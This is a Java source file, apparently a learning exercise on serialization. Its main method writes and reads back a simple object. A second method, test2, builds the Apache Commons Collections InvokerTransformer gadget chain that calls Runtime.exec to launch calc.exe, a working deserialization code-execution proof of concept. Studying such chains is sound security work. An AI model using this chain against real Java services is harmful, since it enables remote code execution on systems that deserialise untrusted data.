package com.kuark.tool.advance.advance20201111;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * @author rock
 * @detail
 * @date 2021/2/20 11:03
 */
public class SeriableMain {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException {
        SeriableVo v=new SeriableVo();
        v.setAge(20);
        v.setName("xiaohong");
        System.out.println("start main");

        // �����л�����д���ļ�object.db��
        FileOutputStream fos = new FileOutputStream("D:\\myProjects\\tools\\src\\main\\java\\com\\kuark\\tool\\advance\\advance20201111\\Seriable.db");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(v);
        os.close();

        // ���ļ�object.db�ж�ȡ����
        FileInputStream fis = new FileInputStream("D:\\myProjects\\tools\\src\\main\\java\\com\\kuark\\tool\\advance\\advance20201111\\Seriable.db");
        TimeUnit.SECONDS.sleep(2);
        System.out.println("mind");
        ObjectInputStream ois = new ObjectInputStream(fis);
        System.out.println("mind 2");
        Object object = ois.readObject();
        System.out.println("mind 3");
        System.out.println(object);
        ois.close();
        System.out.println("start end");
    }

    public static void test2(){
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {
                        String.class }, new Object[] {"calc.exe"})};

        Transformer transformedChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");
    }
}
